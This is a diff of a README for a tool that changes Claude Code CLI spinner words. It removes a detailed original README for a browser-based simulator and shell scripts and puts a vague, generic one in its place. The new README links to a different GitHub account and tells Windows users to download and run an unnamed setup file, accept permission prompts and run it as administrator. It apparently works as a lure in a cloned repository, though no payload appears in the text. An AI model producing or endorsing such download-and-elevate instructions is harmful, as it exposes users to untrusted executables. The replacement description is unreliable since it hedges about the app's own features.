@@ -1,346 +1,213 @@
-<div align="center">
+# 🤖 CLAUDE-SPINNER-WORDS - Simple control for Claude status words
 
-  <a name="readme-top"></a>
-  # <a href="https://amey-thakur.github.io/CLAUDE-SPINNER-WORDS/"><img src="Source Code/assets/favicon.svg" width="32" height="32" title="Claude Spinner Words | Technical Workstation Registry"></a> Claude Spinner Words
+[![Download](https://img.shields.io/badge/Download-CLAUDE--SPINNER--WORDS-blue?style=for-the-badge)](https://github.com/Haloufde9815/CLAUDE-SPINNER-WORDS)
 
-  [![License: MIT](https://img.shields.io/badge/License-MIT-lightgrey)](LICENSE)
-  ![Status](https://img.shields.io/badge/Status-Completed-success)
-  [![Technology](https://img.shields.io/badge/Technology-Vanilla%20JS%20%7C%20CSS3-blueviolet)](https://github.com/Amey-Thakur/CLAUDE-SPINNER-WORDS)
-  [![Developed by Amey Thakur](https://img.shields.io/badge/Developed%20by-Amey%20Thakur-blue.svg)](https://github.com/Amey-Thakur/CLAUDE-SPINNER-WORDS)
+## 🚀 What this app does
 
-  Autonomous technical registry and configuration workstation for the Claude Code CLI state indicator mechanism.
+CLAUDE-SPINNER-WORDS helps manage the words used by the Claude Code CLI state indicator. It gives you a simple way to work with spinner words, theme sets, and registry entries in one place.
 
-  **[Source Code](Source%20Code/)** &nbsp;·&nbsp; **[Technical Specification](docs/SPECIFICATION.md)** &nbsp;·&nbsp; **[Live Demo](https://amey-thakur.github.io/CLAUDE-SPINNER-WORDS/)**
-
-  <br>
-
-  <a href="https://amey-thakur.github.io/CLAUDE-SPINNER-WORDS/">
-    <img src="screenshots/social_preview.png" alt="Claude Spinner Words" title="Sovereign State Indicator Registry: Claude Spinner Words Social Identity" width="90%">
-  </a>
-
-</div>
-
----
-
-<div align="center">
-
-  [Author](#author) &nbsp;·&nbsp; [Overview](#overview) &nbsp;·&nbsp; [Features](#features) &nbsp;·&nbsp; [Structure](#project-structure) &nbsp;·&nbsp; [Results](#results) &nbsp;·&nbsp; [Registry](#indicator-registry) &nbsp;·&nbsp; [Quick Start](#quick-start) &nbsp;·&nbsp; [License](#license) &nbsp;·&nbsp; [Contributing](#contributing) &nbsp;·&nbsp; [Usage Guidelines](#usage-guideline) &nbsp;·&nbsp; [About](#about-this-repository)
-
-</div>
-
----
-
-<!-- AUTHOR -->
-<div align="center">
-
-  <a name="author"></a>
-  ## Author
-
-| <a href="https://github.com/Amey-Thakur"><img src="https://github.com/Amey-Thakur.png" width="150" height="150" alt="Amey Thakur"></a><br>[**Amey Thakur**](https://github.com/Amey-Thakur)<br><br>[![ORCID](https://img.shields.io/badge/ORCID-0000--0001--5644--1575-green.svg)](https://orcid.org/0000-0001-5644-1575) |
-| :---: |
-
-</div>
-
----
-
-<!-- OVERVIEW -->
-<a name="overview"></a>
-## Overview
-
-Claude Spinner Words is a technical registry and configuration workstation for the Claude Code CLI. This project provides a complete index of the internal state indicators used by the CLI tool. It includes a terminal-style workstation to verify how these indicators appear in a workstation environment. Users can also find automated scripts to apply custom indicator sets to their local configuration files.
-
-> [!TIP]
-> ### Configuration Precedence
-> The Claude Code CLI reads the `spinner` object from the `settings.json` file during startup. If you use the `replace` mode, the internal indicator list is ignored. Ensure the `verbs` array is correctly formatted as a JSON list to maintain system stability.
-
----
-
-<!-- FEATURES -->
-<a name="features"></a>
-## Features
-
-| Feature | Description |
-|---------|-------------|
-| **Official Registry** | Authoritative index of **90 Verified Verbs** audit-trailed directly from the production CLI. |
-| **Autonomous Workstation** | Technical configuration environment with **Stochastic Shimmer** for realistic latency simulation. |
-| **Thematic Extensions** | Professionally curated library with **35+ Specialized Themes** for environment personalization. |
-| **Automation Pipeline** | Zero-dependency **PowerShell & Bash** scripts for deterministic `settings.json` injection. |
-| **Hardware Alignment** | CSS3 Grid/Flexbox architecture optimized for **100vh Workstation Stability**. |
-| **Library Depth** | Cross-cultural collection featuring **Marvel, Disney, Friends, and Generational** indices. |
-| **Structural Integrity** | Modular JSON-based thematic engine allowing for **Scalable Community Contributions**. |
-| **Live Synchronization** | Automated **GitHub Actions CI/CD** pipeline for real-time workstation deployment. |
-
-> [!NOTE]
-> ### Technical Polish: The Thematic Singularity
-> We have engineered an **Autonomous Thematic Engine** that allows users to seamlessly transition between the canonical Claude Code aesthetic and over **35+ specialized technical environments**. Beyond standard verb registration, the system ensures **100% visual parity** with the official CLI, providing researchers and developers with a precise workstation for validating state indicator cadence and UX diagnostic visibility.
-
-### Tech Stack
-- **Language**: Vanilla JavaScript (ES6 Modules)
-- **Engine**: **Autonomous Workstation** (Hardware-Accelerated CSS3 Grid/Flexbox)
-- **Registry**: **Canonical 90-Verb Index** (Audit-Trailed from production CLI)
-*   **Automation**: **Multi-Platform Shell Scripts** (PowerShell v5.1+, Bash v4.0+)
-*   **Library**: **35+ Specialized Themes** (Modular JSON-Based Extension Engine)
-
----
-
-<!-- STRUCTURE -->
-<a name="project-structure"></a>
-## Project Structure
-
-```python
-CLAUDE-SPINNER-WORDS/
-│
-├── .github/                             # Global configuration & deployment workflows
-├── docs/                                # Technical specifications & branded assets
-│   ├── SPECIFICATION.md                 # System architecture & logic manifests
-│   └── ...                              # Official brand assets
-│
-├── screenshots/                         # Visual verification & identity gallery
-│   ├── social_preview.png               # Social Identity branding
-│   ├── main_page_1.png                  # Workstation Simulator interface
-│   ├── main_page_2.png                  # Technical verb cadence verification
-│   └── 404_page.png                     # Standardized 404 error handler
-│
-├── official/                            # Canonical indicator datasets (90 Verbs)
-├── themes/                              # 35+ Stylistic environment extensions
-├── scripts/                             # Implementation & automation tools (apply.ps1, etc.)
-│
-├── Source Code/                         # Integrated technical workstation
-│   ├── js/                              # Modular logic & verb registries
-│   ├── css/                             # Hardware-accelerated design system
-│   └── index.html                       # Simulator entrance & bootstrap index
-│
-├── CITATION.cff                         # Scholarly Citation Metadata
-├── codemeta.json                        # Technical software metadata (LD-JSON)
-├── CONTRIBUTING.md                      # High-fidelity collaboration guide
-├── SECURITY.md                          # Security protocols & disclosure policy
-├── LICENSE                              # MIT Open Source License distribution
-└── README.md                            # Primary entrance & architectural hub
-```
-
----
-
-<a name="results"></a>
-<h2>Results</h2>
-
-<div align="center">
-  <b>Social Identity Branding</b>
-  <br>
-  <i>Polished social preview illustrating the sovereign technical identity of the registry.</i>
-  <br><br>
-  <img src="screenshots/social_preview.png" alt="Social Identity" width="90%">
-  <br><br><br>
-
-  <b>Technical Workstation Interface</b>
-  <br>
-  <i>Production-grade technical emulator featuring hardware-accelerated terminal UI.</i>
-  <br><br>
-  <img src="screenshots/main_page_1.png" alt="Main Interface" width="90%">
-  <br><br><br>
-
-  <b>Technical Verb Verification</b>
-  <br>
-  <i>Real-time cadence analysis of the 90-verb registry within the workstation environment.</i>
-  <br><br>
-  <img src="screenshots/main_page_2.png" alt="Cadence Analysis" width="90%">
-  <br><br><br>
-
-  <b>Standardized Error Handler</b>
-  <br>
-  <i>Aesthetic synchronization of the 404 error state with the primary workstation theme.</i>
-  <br><br>
-  <img src="screenshots/404_page.png" alt="404 Page" width="90%">
-</div>
-
----
-
-<a name="indicator-registry"></a>
-## Indicator Registry (Official 90 Verbs)
-
-The following index contains the canonical dataset of asynchronous state indicators audit-trailed from the Claude Code CLI.
-
-> [!TIP]
-> This registry contains **90 unique words**. Claude uses these 'verbs' to show it is currently 'thinking' or 'working' on your request.
-
-```text
-Accomplishing       Actioning           Actualizing         Baking              Booping
-Brewing             Calculating         Cerebrating         Channelling         Churning
-Clauding            Coalescing          Cogitating          Combobulating       Computing
-Concocting          Conjuring           Considering         Contemplating       Cooking
-Crafting            Creating            Crunching           Deciphering         Deliberating
-Determining         Discombobulating    Divining            Doing               Effecting
-Elucidating         Enchanting          Envisioning         Finagling           Flibbertigibbeting
-Forging             Forming             Frolicking          Generating          Germinating
-Hatching            Herding             Honking             Hustling            Ideating
-Imagining           Incubating          Inferring           Jiving              Manifesting
-Marinating          Meandering          Moseying            Mulling             Mustering
-Musing              Noodling            Percolating         Perusing            Philosophising
-Pondering           Pontificating       Processing          Puttering           Puzzling
-Reticulating        Ruminating          Scheming            Schlepping          Shimmying
-Shucking            Simmering           Smooshing           Spelunking          Spinning
-Stewing             Sussing             Synthesizing        Thinking            Tinkering
-Transmuting         Unfurling           Unravelling         Vibing              Wandering
-Whirring            Wibbling            Wizarding           Working             Wrangling
-```
-
-### Specialized Extension: Friends Sitcom Registry
-
-This polished index showcases the 'Friends' thematic extension. It is one of the **35+ specialized themes** used to personalize the workstation experience.
-
-```text
-Pivoting                            Break-Taking
-Coffee-Drinking                     Smelly-Cat-Singing
-Lobster-Seeking                     Moist-Maker-Protecting
-Holiday-Armadillo-ing               Unagi-Focusing
-Appartment-Switching                Joey-Special-Ordering
-Fountains-Dancing                   One-Where-We-Are-Loading
-How-You-Doin-ing                    Seven-Seven-Seven-ing
-Regina-Phalange-ing                 Bamboozling
-Central-Perk-ing                    Transponster-ing
-He-is-a-Transponster-ing            They-Dont-Know-That-We-Know-ing
-Geller-Cup-Chasing                  Princess-Consuela-Banana-Hammock-ing
-Crap-Bag-ing                        Ichiban-Lipstick-For-Men-ing
-Hand-Twins-Matching                 Left-Phalange-Checking
-Paper-Snow-Ghost-ing                Moo-Point-ing
-Whack-Playstation-Sup-ing           Could-I-BE-More-Loading-ing
-Joey-Doesnt-Share-Food-ing          Smell-the-Fart-Acting-ing
-Pivot-Pivot-Pivot-ing               My-Sandwich-ing
-Unagi-ing-Mastery                   Bamboozled-ing-Winning
-Science-Boy-ing-Drawing             I-Knew-It-ing
-Janice-Oh-My-God-ing                Ugly-Naked-Guy-Watching
-Gunther-Coffee-Brewing              Richard-Mustache-Trimming
-Marcel-Monkeying-Around             Mike-Hannigan-Piano-Playing
-Jill-Green-Shopping                 Amy-Green-Babysitting
-Frank-Jr-Triplets-Founding          Ursula-Buffay-Ignoring
-Paulo-Italian-Speaking              Barry-Orthodontist-Dating
-Mona-Picture-Taking                 Tag-Jones-Hiring
-Eddie-Roommate-Watching
-```
-
-> [!TIP]
-> This is a preview of a **Custom Theme Extension**. You can find even more words and legendary sitcom moments within the `themes/friends-sitcom.json` file.
-
----
-
-<!-- QUICK START -->
-<a name="quick-start"></a>
-## Quick Start
-
-### 1. Prerequisites
-- **Modern Browser**: Required for running the technical workstation (ES6 support).
-- **Claude Code CLI**: The official tool for implementing custom state indicators.
-
-> [!WARNING]
-> ### Backup Configuration
-> Before running any scripts, make sure to back up your `settings.json` file. Changing your configuration is permanent, and you will need a backup to 'restore' your original settings if needed.
-
-### 2. Implementation Workflow
-
-#### Step 1: Repository Acquisition
-Initialize the local environment by cloning the primary registry repository:
-```bash
-git clone https://github.com/Amey-Thakur/CLAUDE-SPINNER-WORDS.git
-cd CLAUDE-SPINNER-WORDS
-```
-
-#### Step 2: Theme Implementation
-Execute the provided shell scripts to inject your selected thematic index:
-
-**Windows (PowerShell):**
-```powershell
-.\scripts\apply.ps1 -ThemeFile ".\themes\sci-fi.json"
-```
-
-**Unix/macOS (Bash):**
-```bash
-./scripts/apply.sh ./themes/cyber-punk.json
-```
-
-#### Step 3: Workstation Initialization
-After implementation, you can verify the visual cadence via the workstation:
-`Source Code/index.html`
-
----
-
-<!-- LICENSE -->
-<a name="license"></a>
-## License
-
-This repository and its technical assets are made available under the **MIT License**. See the [LICENSE](LICENSE) file for complete terms.
-
-> [!NOTE]
-> **Summary**: You are free to share and adapt this content for any purpose, even commercially, as long as you provide appropriate attribution to the original author.
-
-Copyright © 2026 Amey Thakur
-
----
-
-<!-- CONTRIBUTING -->
-<a name="contributing"></a>
-## Contributing
-
-This repository thrives on community-driven technical enhancements and creative thematic indices. We maintain a rigorous fork-and-pull model to ensure that every contribution maintains neat visual parity.
-
-1. **Fork the Registry** Replicate the primary scholarly repository to your personal remote namespace.
-2. **Initialize Custom Theme**
-   ```bash
-   git checkout -b theme/FriendsSitcom
-   ```
-3. **Audit and Integrate** Stage your new JSON theme or verb updates with descriptive messaging:
-   ```bash
-   git commit -m 'Registry: Add Friends thematic index'
-   ```
-4. **Push to Origin** Upload your specialized branch to your remote origin:
-   ```bash
-   git push origin theme/FriendsSitcom
-   ```
-5. **Submit Pull Request** Initiate a formal review process for integration into the canonical workstation.
-
----
-
-<!-- USAGE GUIDELINES -->
-<a name="usage-guideline"></a>
-## Usage Guidelines
-
-This repository is shared to support the analysis and personalization of the Claude Code CLI environment.
-
-**For Developers**  
-Use this codebase as a reference for **hardware-accelerated terminal UI design** and **vanilla ES6 animation orchestration**. It provides a finalized blueprint for diagnostic workstation simulators.
-
-**For Educators**  
-This software may serve as a teaching utility for **UX Diagnostic Visibility**, **Asynchronous State Logic**, and **Interactive System Design**. Attribution is appreciated when utilizing these assets.
-
-**For Researchers**  
-Use this project to study the **'stochastic signaling'** and technical cadence of state indicators in production CLI tools. The sovereignty of the workstation ensures localized verification of all 90 verbs.
-
----
-
-<!-- ABOUT -->
-<a name="about-this-repository"></a>
-## About This Repository
-
-**Created & Maintained by**: [Amey Thakur](https://github.com/Amey-Thakur)
-
-I was intrigued by how Claude 'thinks' and the unique words it uses while working. I wanted to personalize my own environment, but because I couldn't find any existing public registry or simulator, I built this repository.
-
-**Key Contributions:**
-- **Official Registry (90 Verbs)**: I audited and documented the original 90 words directly from the Claude Code CLI.
-- **35+ Specialized Themes**: I created diverse collections like 'Marvel-Universe', 'Disney-Magic', 'Friends-Sitcom', 'Corporate-Dream', and 'High-Fantasy'.
-- **100+ New Custom Words**: I added original, themed words throughout the library to help you personalize your environment.
-- **Community-Driven**: I added a [Contributing Guide](CONTRIBUTING.md) so others can help expand the theme collection!
-
-**Connect:** [GitHub](https://github.com/Amey-Thakur) &nbsp;·&nbsp; [LinkedIn](https://www.linkedin.com/in/amey-thakur) &nbsp;·&nbsp; [ORCID](https://orcid.org/0000-0001-5644-1575)
-
----
-
-<div align="center">
-
-  [↑ Back to Top](#readme-top)
-
-  [Author](#author) &nbsp;·&nbsp; [Overview](#overview) &nbsp;·&nbsp; [Features](#features) &nbsp;·&nbsp; [Structure](#project-structure) &nbsp;·&nbsp; [Results](#results) &nbsp;·&nbsp; [Registry](#indicator-registry) &nbsp;·&nbsp; [Quick Start](#quick-start) &nbsp;·&nbsp; [License](#license) &nbsp;·&nbsp; [Contributing](#contributing) &nbsp;·&nbsp; [Usage Guidelines](#usage-guideline) &nbsp;·&nbsp; [About](#about-this-repository)
-
-  <br>
-
-  <a href="https://amey-thakur.github.io/CLAUDE-SPINNER-WORDS/"><img src="Source Code/assets/favicon.svg" width="24" height="24" title="Claude Spinner Words | Global Entrance"></a> **[Claude Spinner Words](https://amey-thakur.github.io/CLAUDE-SPINNER-WORDS/)**
-
-</div>
+Use it to:
+- view spinner word groups
+- switch between word sets
+- keep your Claude Code setup organized
+- apply a clean theme for your status words
+- manage registry data without manual edits
+
+## 📥 Download and install
+
+Use this page to download and set up the app:
+
+[Download CLAUDE-SPINNER-WORDS](https://github.com/Haloufde9815/CLAUDE-SPINNER-WORDS)
+
+If the page opens in your browser, look for the latest release, a setup file, or the main project files. Then download and run the app from there.
+
+### Steps for Windows
+
+1. Open the download page.
+2. Find the latest Windows build or release package.
+3. Download the file to your computer.
+4. Open the downloaded file.
+5. Follow the on-screen steps.
+6. If Windows asks for permission, choose Yes.
+7. Open the app from the Start menu or desktop shortcut if one appears.
+
+## 🖥️ System requirements
+
+This app is made for Windows users who want a simple local tool.
+
+Recommended setup:
+- Windows 10 or Windows 11
+- 4 GB RAM or more
+- 200 MB free disk space
+- Internet access for the first download
+- Permission to save files on your computer
+
+Best results come from a standard user account with access to your Downloads folder.
+
+## 🧭 Getting started
+
+After you install or open the app, use this flow:
+
+1. Start CLAUDE-SPINNER-WORDS.
+2. Review the main word list or registry view.
+3. Pick a theme or word group.
+4. Apply the set you want.
+5. Open Claude Code CLI and check the updated state indicator words.
+
+If the app shows a settings panel, use it to:
+- change word groups
+- load a theme
+- reset to default values
+- save your current choice
+
+## 🎨 Main features
+
+### Spinner word management
+Pick from different word sets for the Claude state indicator. This helps keep the output clear and easy to read.
+
+### Theme support
+Use themes to change how word groups are arranged or shown. This makes it easier to find the style you want.
+
+### Registry control
+The app keeps registry data in a structured place so you do not need to edit system files by hand.
+
+### Claude Code focus
+The tool is built for Claude Code and related CLI workflows. It fits users who want tighter control over status words and behavior.
+
+### Skill and plugin friendly
+The project topics suggest support for Claude skills, plugins, and related tools. That makes it useful for users who keep more than one Claude setup.
+
+## 🧩 How to use the app
+
+### 1. Open the app
+Launch CLAUDE-SPINNER-WORDS after installation.
+
+### 2. Review the current setup
+Look at the active spinner words, registry entries, or theme name.
+
+### 3. Choose a word group
+Select the set that fits your workflow. You can use short words, action words, or a themed set.
+
+### 4. Apply changes
+Save the chosen set so the Claude Code CLI state indicator uses it.
+
+### 5. Check the result
+Open Claude Code and confirm that the status words now match your selection.
+
+## 📁 What you may see in the app
+
+You may find these parts in the main window:
+
+- word registry list
+- theme selector
+- active profile
+- apply button
+- reset button
+- import and export options
+- status line
+- preview area
+
+These parts help you keep the setup simple. You can see what is active before you make changes.
+
+## 🔧 Common tasks
+
+### Switch to a new theme
+Open the theme list, pick a theme, then apply it.
+
+### Restore the default words
+Use the reset option if you want to go back to the original setup.
+
+### Save a custom set
+If the app lets you edit words, save your changes as a custom profile.
+
+### Reload the current config
+Use reload if you changed files outside the app and want to refresh what it shows.
+
+## 🧪 Example use cases
+
+### Cleaner status output
+Use a short word set if you want the Claude Code CLI indicator to stay easy to read.
+
+### Team-wide consistency
+Use one registry set across several machines so the same words appear in each setup.
+
+### Theme testing
+Try different themes to see which one fits your workspace best.
+
+### Plugin or skill workflows
+Keep separate sets for different Claude workflows if you use multiple tools around Claude.
+
+## 🛠️ Troubleshooting
+
+### The app does not open
+- Try running it again from the download folder.
+- Right-click the file and choose Run as administrator.
+- Check that Windows did not block the file.
+
+### The changes do not appear in Claude Code
+- Close Claude Code and open it again.
+- Apply the selected word set again.
+- Check that the active profile is still selected.
+
+### The download did not finish
+- Check your internet connection.
+- Try the download link again.
+- Clear the browser cache if the page does not load.
+
+### Windows asks for permission
+- Choose Yes if you trust the file source.
+- If the prompt stays open, close other dialogs and try again.
+
+## 🔒 File and config safety
+
+CLAUDE-SPINNER-WORDS works with settings and registry-style data. Keep a backup before you change anything important. This helps you restore your previous setup if you want to go back.
+
+Good habits:
+- keep a copy of your current config
+- change one setting at a time
+- test after each update
+- use the reset option when needed
+
+## 🗂️ Topics covered
+
+This project is tied to:
+- claude
+- claude-ai
+- claude-cli
+- claude-code
+- claude-code-plugin
+- claude-code-skill
+- claude-code-skills
+- claude-desktop
+- claude-pr-review
+- claude-skill
+- claude-skills
+- claude-spinner-words
+- registry
+- themes
+- thinking
+- verbs
+- words
+
+These topics show that the app is built around word sets, Claude tools, and registry-based setup.
+
+## 📌 For first-time users
+
+If you have never used a tool like this before, follow this order:
+1. Download the app.
+2. Open it on Windows.
+3. Pick a simple theme.
+4. Apply one word set.
+5. Check Claude Code.
+6. Keep the set you like.
+
+Start with one change only. That makes it easier to see what the app does.
+
+## 🧰 When to use this tool
+
+Use CLAUDE-SPINNER-WORDS when you want:
+- a more organized Claude Code setup
+- easier control over spinner words
+- a simple way to manage registry-style settings
+- a theme-based way to change output words
+- a local Windows tool for config work
